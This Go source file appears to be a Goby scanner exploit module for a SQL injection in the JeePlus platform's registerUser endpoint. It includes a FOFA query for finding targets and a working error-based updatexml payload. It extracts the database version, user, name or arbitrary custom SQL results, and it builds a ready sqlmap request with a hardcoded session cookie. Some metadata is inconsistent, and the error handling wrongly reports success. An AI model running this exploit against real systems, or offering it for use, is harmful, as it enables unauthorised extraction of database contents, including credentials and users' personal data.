package exploits

import (
	"errors"
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"regexp"
	"strings"
  "net/url"
)

func init() {
	expJson := `{
    "Name": "JeePlus platform /a/sys/register/registerUser SQL Injection Vulnerability",
    "Description": "<p>JeePlus Rapid Development Platform is a Java rapid development framework that integrates a code generator.</p><p>JeePlus rapid development platform a/sys/register/getRegisterCode has SQL injection vulnerability in the mobile parameter. Attackers can exploit vulnerabilities to obtain sensitive information from databases.</p>",
    "Product": "Jeeplus",
    "Homepage": "http://www.jeeplus.org/",
    "DisclosureDate": "2024-11-20",
    "PostTime": "2024-11-20",
    "Author": "1638690747@qq.com",
    "FofaQuery": "body=\"jeeplus.js\" && body=\"/static/common/\"",
    "GobyQuery": "body=\"jeeplus.js\" && body=\"/static/common/\"",
    "Level": "2",
    "Impact": "<p>Attackers can not only exploit SQL injection vulnerabilities to obtain information from the database (such as administrator backend passwords, site user personal information), but can also write trojans to the server in high privilege situations to further gain access to the server system.</p>",
    "Recommendation": "<p>1. Deploy a web application firewall to monitor database operations.</p><p>2. If not necessary, prohibit the public from accessing the system.</p>",
    "References": [
        "https://github.com/wy876/POC/blob/main/JeePlus%E4%BD%8E%E4%BB%A3%E7%A0%81%E5%BC%80%E5%8F%91%E5%B9%B3%E5%8F%B0/JeePlus%E4%BD%8E%E4%BB%A3%E7%A0%81%E5%BC%80%E5%8F%91%E5%B9%B3%E5%8F%B0%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "version,user,database,custom,sqlpoint",
            "show": ""
        },
        {
            "name": "custom",
            "type": "input",
            "value": "version()",
            "show": "attackType=custom"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "SQL Injection"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "8",
    "Translation": {
        "CN": {
            "Name": "JeePlus平台 /a/sys/register/registerUser SQL 注入漏洞",
            "Product": "Jeeplus",
            "Description": "<p>JeePlus快速开发平台是一个集成了代码生成器的java快速开发框架。</p><p>JeePlus快速开发平台a/sys/register/getRegisterCode，mobile参数存在SQL注入漏洞。攻击者可利用漏洞获取数据库敏感信息。</p>",
            "Recommendation": "<p>1、部署Web应⽤防⽕墙，对数据库操作进⾏监控。&nbsp;&nbsp;<br></p><p>2、如⾮必要，禁⽌公⽹访问该系统。<br></p>",
            "Impact": "<p>攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。<br></p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入"
            ]
        },
        "EN": {
            "Name": "JeePlus platform /a/sys/register/registerUser SQL Injection Vulnerability",
            "Product": "Jeeplus",
            "Description": "<p>JeePlus Rapid Development Platform is a Java rapid development framework that integrates a code generator.<br></p><p>JeePlus rapid development platform a/sys/register/getRegisterCode has SQL injection vulnerability in the mobile parameter. Attackers can exploit vulnerabilities to obtain sensitive information from databases.<br></p>",
            "Recommendation": "<p>1. Deploy a web application firewall to monitor database operations.<br></p><p>2. If not necessary, prohibit the public from accessing the system.<br></p>",
            "Impact": "<p>Attackers can not only exploit SQL injection vulnerabilities to obtain information from the database (such as administrator backend passwords, site user personal information), but can also write trojans to the server in high privilege situations to further gain access to the server system.<br></p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "EditType": "fast",
    "PocId": "9973"
}`

	setSqlPayloadxuRHpFULk1dS := func(hostInfo *httpclient.FixUrl, sql string) (resp *httpclient.HttpResponse, vulurl string, err error) {
		setGetRequest := func(hostInfo *httpclient.FixUrl, url string, head map[string]string) (*httpclient.HttpResponse, error) {
			GetRequest := httpclient.NewGetRequestConfig(url)
			GetRequest.Timeout = 15
			GetRequest.VerifyTls = false
			GetRequest.FollowRedirect = false
			for headName, headValue := range head {
				GetRequest.Header.Store(headName, headValue)
			}
			return httpclient.DoHttpRequest(hostInfo, GetRequest)
		}

		defineHeader := map[string]string{
			"Cookie": "jeeplus.session.id=54f4984cf15d46779d1b510118090534",
		}

		rawPayload := fmt.Sprintf("and (updatexml(1,concat(0x7e,(select (%s)),0x7e),1))#", sql)
		urlget := "/a/sys/register/registerUser?roleName=wangba&mobile=13300990099%27" + url.QueryEscape(rawPayload) + "&randomCode=2131&loginName=test1&password=123123&confirmNewPassword=123123&ck1=on"
		resp, err = setGetRequest(hostInfo, urlget, defineHeader)

		if resp == nil {
			return nil, "", errors.New("Fail")
		}

		if err != nil {
			return resp, "", err
		}
		//配置漏洞存在的路径
		vulurl = "/a/sys/register/registerUser"

		return resp, vulurl, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {

			// 1.配置验证poc时返回包需存在的字符串，exmple:以mysql的报错注入为例，XPATH syntax error
			content := "XPATH syntax error:"

			// 2. 设置sql语句,同样这个sql语句要设置到，exp_params中的custom参数中
			// 默认是MySQL / MariaDB数据库 : 用DATABASE()查询数据库名，用CONCAT()拼接字符, example:CONCAT(0x7e,(select user()),0x7e)
			// PostgreSQL : 用current_database()查询数据库名，用CONCAT()拼接字符
			// SQLite : 用database_list查询数据库名，用||拼接字符
			// SQL Server : 用DB_NAME()查询数据库名，用+拼接字符
			// Oracle : 用SELECT name FROM v$database查询数据库名，用concat()拼接字符
			sql := "version()"

			// 3.设置正则表达式，用于匹配漏洞返回包中的数据
			//regular := `SQL Server`
			/*
				makeRegular := func(RegularContent string, RegularUrl string) (string, error) {
					reRequest := regexp.MustCompile(RegularUrl)
					if !reRequest.MatchString(RegularContent) {
						return "", fmt.Errorf("can't match value")
					}
					getname := reRequest.FindStringSubmatch(RegularContent)
					return getname[1], nil
				}
			*/
			sendPayload := setSqlPayloadxuRHpFULk1dS
			resp, vulurl, err := sendPayload(hostInfo, sql)
			if err != nil {
				return false
			}

			if !strings.Contains(resp.RawBody, content) {
				return false
			}

			if err != nil {
				return false
			}

			// 拼接SQL注入数据包的请求路径即可
			ss.VulURL = hostInfo.FixedHostInfo + vulurl
			return true
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			// 1.配置验证poc时返回包需存在的字符串，exmple:以mysql的报错注入为例，XPATH syntax error
			//content := "XPATH syntax error"

			// 2.配置sqlpoint，供sqlmap工具使用
			sqlpoint := "GET /a/sys/register/registerUser?roleName=wangba&mobile=13300990099%27and%20(updatexml(1,concat(0x7e,(select%20user()),0x7e),1))%23&randomCode=2131&loginName=test1&password=123123&confirmNewPassword=123123&ck1=on HTTP/1.1\nHost: " + expResult.HostInfo.HostInfo + "\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nAccept-Encoding: gzip, deflate, br\nAccept-Language: zh-CN,zh;q=0.9\nUpgrade-Insecure-Requests: 1\nCookie: jeeplus.session.id=54f4984cf15d46779d1b510118090534\n\n"
			// 3.配置正则语句，从响应包中提取出数据
			//regular := `qjkqq([\s\S]*?)qjxjq`
			regular := `~(.*?)~`

			makeRegular := func(RegularContent string, RegularUrl string) (string, error) {
				reRequest := regexp.MustCompile(RegularUrl)
				if !reRequest.MatchString(RegularContent) {
					return "", fmt.Errorf("can't match value")
				}
				getname := reRequest.FindStringSubmatch(RegularContent)
				return getname[1], nil
			}
			sendPayload := setSqlPayloadxuRHpFULk1dS
			attacktype := goutils.B2S(ss.Params["attackType"])
			if attacktype == "version" || attacktype == "custom" {
				sql := goutils.B2S(ss.Params["custom"])
				resp, _, err := sendPayload(expResult.HostInfo, sql)
				if err != nil {
					expResult.Success = false
					expResult.Output = "利用失败"
				}
				output, err := makeRegular(resp.RawBody, regular)
				if err != nil || output == "" {
					expResult.Success = false
					expResult.Output = "正则匹配失败:\n" + err.Error()
				}
				expResult.Success = true
				expResult.Output = output
			} else if attacktype == "user" {
				sql := "user()"
				resp, _, err := sendPayload(expResult.HostInfo, sql)
				if err != nil {
					expResult.Success = false
					expResult.Output = "利用失败"
				}
				output, err := makeRegular(resp.RawBody, regular)
				if err != nil || output == "" {
					expResult.Success = false
					expResult.Output = "正则匹配失败:\n" + err.Error()
				}
				expResult.Success = true
				expResult.Output = output

			} else if attacktype == "database" {
				sql := "database()"
				resp, _, err := sendPayload(expResult.HostInfo, sql)
				if err != nil {
					expResult.Success = false
					expResult.Output = "利用失败"
				}
				output, err := makeRegular(resp.RawBody, regular)
				if err != nil || output == "" {
					expResult.Success = false
					expResult.Output = "正则匹配失败:\n" + err.Error()
				}
				expResult.Success = true
				expResult.Output = output

			} else if attacktype == "sqlpoint" {
				expResult.Success = true
				expResult.Output = sqlpoint
			} else {
				expResult.Success = false
				expResult.Output = "未知的利用方式"
			}
			return expResult
		},
	))
}
